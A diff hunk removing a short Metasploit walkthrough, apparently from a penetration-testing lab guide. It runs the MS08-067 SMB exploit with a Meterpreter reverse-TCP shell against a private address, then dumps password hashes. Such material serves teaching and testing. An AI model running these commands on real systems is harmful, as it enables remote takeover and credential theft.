@@ -1,7 +1,0 @@
-Compromise the System
-msf > use exploit/windows/smb/ms08_067_netapi
-msf (ms08_067_netapi) > set payload /windows/meterpreter/reverse_tcp
-msf (ms08_067_netapi) > set RHOST 192.168.1.108
-msf (ms08_067_netapi) > set LHOST 192.168.1.109
-msf (ms08_067_netapi) > exploit
-meterpreter > hashdump
